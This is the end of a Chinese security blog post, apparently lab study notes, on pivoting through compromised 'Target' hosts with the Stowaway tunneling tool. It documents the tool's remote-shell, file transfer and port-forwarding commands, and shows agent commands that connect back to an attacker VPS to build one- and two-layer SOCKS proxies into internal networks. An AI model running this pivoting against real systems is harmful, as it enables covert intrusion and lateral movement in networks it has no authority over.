<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; ./stowaway_admin -l &lt;port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password]</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --rhostreuse</span><br><span class="line">&gt;&gt; ./stowaway_admin -c &lt;ip:port&gt; -s [secret] --proxy &lt;ip:port&gt; --proxyu [username] --proxyp [password] --rhostreuse</span><br></pre></td></tr></table></figure>

<ul>
<li>admin 参数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure>



<ul>
<li>admin 主 panel 选项：（admin面板，连接后可以执行哪些操作）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(admin) &gt;&gt; help</span><br><span class="line">  help                                          显示帮助信息</span><br><span class="line">  detail                                        展示在线节点的详细信息</span><br><span class="line">  topo                                          展示在线节点的父子关系，拓扑图</span><br><span class="line">  use        &lt;id&gt;                               选择你要使用的目标节点</span><br><span class="line">  exit                                          退出 Stowaway</span><br></pre></td></tr></table></figure>



<ul>
<li>admin node panel 选项：(node面板 对node执行的操作）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(node 0) &gt;&gt; help</span><br><span class="line"> help                                            显示帮助信息</span><br><span class="line"> listen                                          开始监听当前节点的端口</span><br><span class="line"> addmemo    &lt;string&gt;                             为当前节点添加备忘录</span><br><span class="line"> delmemo                                         删除当前节点的备忘录</span><br><span class="line"> ssh        &lt;ip:port&gt;                            通过当前节点启动SSH</span><br><span class="line"> shell                                           在当前节点上启动一个交互式shell</span><br><span class="line"> socks      &lt;lport&gt; [username] [pass]            启动一个socks5服务器</span><br><span class="line"> stopsocks                                       关闭socks服务</span><br><span class="line"> connect    &lt;ip:port&gt;                            连接到一个新节点</span><br><span class="line"> sshtunnel  &lt;ip:sshport&gt; &lt;agent port&gt;            使用sshtunnel将节点添加到我们的拓扑结构中</span><br><span class="line"> upload     &lt;local filename&gt; &lt;remote filename&gt;   上传文件到当前节点</span><br><span class="line"> download   &lt;remote filename&gt; &lt;local filename&gt;   从当前节点下载文件</span><br><span class="line"> forward    &lt;lport&gt; &lt;ip:port&gt;                    转发本地端口到特定的远程 ip:port</span><br><span class="line"> stopforward                                     关闭转发服务</span><br><span class="line"> backward    &lt;rport&gt; &lt;lport&gt;                     将远程端口(agent)映射到本地端口(admin)。与forward相反</span><br><span class="line"> stopbackward                                    关闭backward服务</span><br><span class="line"> shutdown                                        终止当前节点</span><br><span class="line"> back                                            返回到父面板</span><br><span class="line"> exit                                            退出Stowaway</span><br></pre></td></tr></table></figure>

<h3 id="agent"><a href="#agent" class="headerlink" title="-agent"></a>-agent</h3><ul>
<li>agent 参数:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l 被动模式下的监听地址[ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">--proxy socks5代理服务器地址</span><br><span class="line">--proxyu socks5代理服务器用户名(可选)</span><br><span class="line">--proxyp socks5代理服务器密码(可选)</span><br><span class="line">--reconnect 重连时间间隔</span><br><span class="line">--rehost 端口复用时复用的IP地址</span><br><span class="line">--report 端口复用时复用的端口号</span><br><span class="line">--up 上游协议类型,默认为裸TCP流量,可选HTTP</span><br><span class="line">--down 下游协议类型,默认为裸TCP流量,可选HTTP</span><br></pre></td></tr></table></figure>



<h2 id="建立一层socks代理"><a href="#建立一层socks代理" class="headerlink" title="建立一层socks代理"></a>建立一层socks代理</h2><ul>
<li>在VPS上开启监听（也可以是target监听，vps用connect命令，主动连接添加节点)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_admin -l 9999 -s hack</span><br><span class="line">开启监听等待其他节点连接</span><br><span class="line">-l 被动模式下的监听地址 [ip]:&lt;port&gt;</span><br><span class="line">-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致</span><br></pre></td></tr></table></figure>



<ul>
<li>Target1</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/stowaway_agent -c 47.101.214.85:9999 -s hack</span><br><span class="line">主动连接admin，连接后target1是node id =0</span><br><span class="line">-c 主动模式下的目标节点地址</span><br><span class="line">-s 节点通信加密密钥</span><br></pre></td></tr></table></figure>



<ul>
<li>进入Target1的node节点，开启socks代理</li>
</ul>
<p>注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 1080</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243293.png" alt="image-20220921024307025"></p>
<ul>
<li>测试socks代理</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243699.png" alt="image-20220921024315473"></p>
<h2 id="建立二层socks代理"><a href="#建立二层socks代理" class="headerlink" title="建立二层socks代理"></a>建立二层socks代理</h2><ul>
<li>首先在 node 0 中开启监听</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">listen        在target1开启监听7070端口，让target2连接上target1，这个命令是在vps上执行的</span><br><span class="line">1</span><br><span class="line">7070        []表示可选，&lt;&gt;表示必选</span><br></pre></td></tr></table></figure>

<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210243114.png" alt="image-20220921024349881"></p>
<p>在 Target1 上可以看到 agent 监听了 7070 端口</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244465.png" alt="image-20220921024401182"></p>
<ul>
<li>在 Target2 中连接 Target1 监听的 7070 端口</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stowaway_agent -c 192.168.2.151:7070 -s hack</span><br><span class="line">主动连接</span><br><span class="line">use 1</span><br><span class="line">socks 1088           </span><br><span class="line">样开启socks 1088端口，注意注意的是，开启的socks代理，虽然是在node节点上执行的命令，但是socks代理是开启在admin机器上</span><br></pre></td></tr></table></figure>



<ul>
<li>admin 接收到新的 node 1 , 进入 node 1 节点开启 socks 代理</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244010.png" alt="image-20220921024419783"></p>
<ul>
<li>测试代理</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210244486.png" alt="image-20220921024426178"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gungnir.top/">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gungnir.top/posts/64585">http://gungnir.top/posts/64585</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gungnir.top" target="_blank">晚上十一点睡觉のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/socks5/">socks5</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%90%86/">代理</a></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308761.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/6759"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237505.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">MobaXterm教程</div></div></a></div><div class="next-post pull-right"><a href="/posts/27055"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237579.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">面试题</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点睡觉的个人博客，个人笔记及日志，最近在学习网络安全和Python</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" rel="external nofollow noreferrer" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Socks代理简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">什么是代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">正向代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">反向代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">透明代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSocks"><span class="toc-number">1.5.</span> <span class="toc-text">什么是Socks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsocks%E4%BB%A3%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">什么是socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">我们为什么使用socks5代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Socks%E4%BB%A3%E7%90%86"><span class="toc-number">1.8.</span> <span class="toc-text">使用Socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E4%B8%8EVPN%E5%8C%BA%E5%88%AB"><span class="toc-number">1.9.</span> <span class="toc-text">Socks代理与VPN区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.10.</span> <span class="toc-text">Socks代理工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EarthWorm%EF%BC%88%E7%94%A8%E7%9A%84%E5%B0%91%E4%BA%86%EF%BC%8C%E5%AE%B9%E6%98%93%E8%A2%AB%E6%9D%80%EF%BC%8C%E4%BD%86%E5%BE%88%E7%BB%8F%E5%85%B8%EF%BC%89"><span class="toc-number">1.10.1.</span> <span class="toc-text">EarthWorm（用的少了，容易被杀，但很经典）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FRP"><span class="toc-number">1.10.2.</span> <span class="toc-text">FRP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProxyChains%EF%BC%88linux%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6%E3%80%81kali%E5%86%85%E7%BD%AE"><span class="toc-number">1.10.3.</span> <span class="toc-text">ProxyChains（linux代理软件、kali内置)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxifier%EF%BC%88%E8%80%81%E5%B8%88%E7%94%A8%E7%9A%84%E5%A4%9A%EF%BC%89"><span class="toc-number">1.10.4.</span> <span class="toc-text">Proxifier（老师用的多）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Others"><span class="toc-number">1.10.5.</span> <span class="toc-text">-Others</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%80-MSF"><span class="toc-number">2.</span> <span class="toc-text">Socks代理实战一(MSF)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%9C%BA%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">渗透场景介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">-探测敏感目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">-页面分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8FTarget1"><span class="toc-number">2.4.</span> <span class="toc-text">渗透Target1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8FTarget2"><span class="toc-number">2.5.</span> <span class="toc-text">渗透Target2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97target1%E7%9A%84shell%E5%90%8E%EF%BC%8C%E6%B7%BB%E5%8A%A0%E5%88%B0-192-168-2-%E7%BD%91%E6%AE%B5%E7%9A%84%E8%B7%AF%E7%94%B1"><span class="toc-number">2.5.1.</span> <span class="toc-text">-获得target1的shell后，添加到 192.168.2 网段的路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-MSF-%E7%9A%84-socks5-%E6%A8%A1%E5%9D%97%E5%BB%BA%E7%AB%8B-socks-%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%EF%BC%88%E4%BD%BF%E7%94%A8msf%E4%BC%9A%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%89"><span class="toc-number">2.5.2.</span> <span class="toc-text">-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEproxychains%E4%BB%A3%E7%90%86"><span class="toc-number">2.5.3.</span> <span class="toc-text">-配置proxychains代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E9%AA%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">2.5.4.</span> <span class="toc-text">-检验测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86namp%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91"><span class="toc-number">2.5.5.</span> <span class="toc-text">-代理namp扫描内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.6.</span> <span class="toc-text">-分析利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5shell"><span class="toc-number">2.5.7.</span> <span class="toc-text">-配置socks代理连接shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8FTarget3"><span class="toc-number">2.6.</span> <span class="toc-text">渗透Target3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.6.1.</span> <span class="toc-text">-探测存活主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Target2%E7%9A%84shell"><span class="toc-number">2.6.2.</span> <span class="toc-text">-获取Target2的shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%88%B033%E7%BD%91%E6%AE%B5%E7%9A%84%E8%B7%AF%E7%94%B1"><span class="toc-number">2.6.3.</span> <span class="toc-text">-添加到33网段的路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86nmap%E6%89%AB%E6%8F%8FTarget3"><span class="toc-number">2.6.4.</span> <span class="toc-text">-代理nmap扫描Target3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%AE%E5%AD%90%E9%B1%BCcms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%8B%BFshell"><span class="toc-number">2.6.5.</span> <span class="toc-text">-狮子鱼cms任意文件上传拿shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%BA%8C-FRP"><span class="toc-number">3.</span> <span class="toc-text">Socks代理实战二(FRP)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8FTarget1-1"><span class="toc-number">3.1.</span> <span class="toc-text">渗透Target1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD-webshell%EF%BC%88%E5%86%B0%E8%9D%8E%E7%9A%84%EF%BC%89%E5%88%B0%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-number">3.1.1.</span> <span class="toc-text">-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FRP%E5%BB%BA%E7%AB%8BSocks%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.</span> <span class="toc-text">FRP建立Socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FRP%E5%BB%BA%E7%AB%8B%E4%BA%8C%E5%B1%82Socks%E4%BB%A3%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">FRP建立二层Socks代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socks%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%89-Stowaway"><span class="toc-number">4.</span> <span class="toc-text">Socks代理实战三(Stowaway)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stowaway%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.</span> <span class="toc-text">Stowaway简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">4.2.</span> <span class="toc-text">名词解释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stowaway%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">4.3.</span> <span class="toc-text">Stowaway使用说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin"><span class="toc-number">4.3.1.</span> <span class="toc-text">-admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#agent"><span class="toc-number">4.3.2.</span> <span class="toc-text">-agent</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E4%B8%80%E5%B1%82socks%E4%BB%A3%E7%90%86"><span class="toc-number">4.4.</span> <span class="toc-text">建立一层socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E4%BA%8C%E5%B1%82socks%E4%BB%A3%E7%90%86"><span class="toc-number">4.5.</span> <span class="toc-text">建立二层socks代理</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/40881" title="hexo教程-搜索引擎收录"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308742.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搜索引擎收录"/></a><div class="content"><a class="title" href="/posts/40881" title="hexo教程-搜索引擎收录">hexo教程-搜索引擎收录</a><time datetime="2022-12-01T19:46:44.476Z" title="更新于 2022-12-02 03:46:44">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/27148" title="hexo教程-搭建个人博客踩坑"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308757.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搭建个人博客踩坑"/></a><div class="content"><a class="title" href="/posts/27148" title="hexo教程-搭建个人博客踩坑">hexo教程-搭建个人博客踩坑</a><time datetime="2022-12-01T19:13:05.101Z" title="更新于 2022-12-02 03:13:05">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4710" title="12. 网络编程"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237563.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="12. 网络编程"/></a><div class="content"><a class="title" href="/posts/4710" title="12. 网络编程">12. 网络编程</a><time datetime="2022-12-01T18:46:52.094Z" title="更新于 2022-12-02 02:46:52">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5964" title="11. 异常与文件操作"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237490.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11. 异常与文件操作"/></a><div class="content"><a class="title" href="/posts/5964" title="11. 异常与文件操作">11. 异常与文件操作</a><time datetime="2022-12-01T07:21:16.578Z" title="更新于 2022-12-01 15:21:16">2022-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22609" title="网站SEO优化"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237551.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网站SEO优化"/></a><div class="content"><a class="title" href="/posts/22609" title="网站SEO优化">网站SEO优化</a><time datetime="2022-11-30T11:09:16.189Z" title="更新于 2022-11-30 19:09:16">2022-11-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.gungnir.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>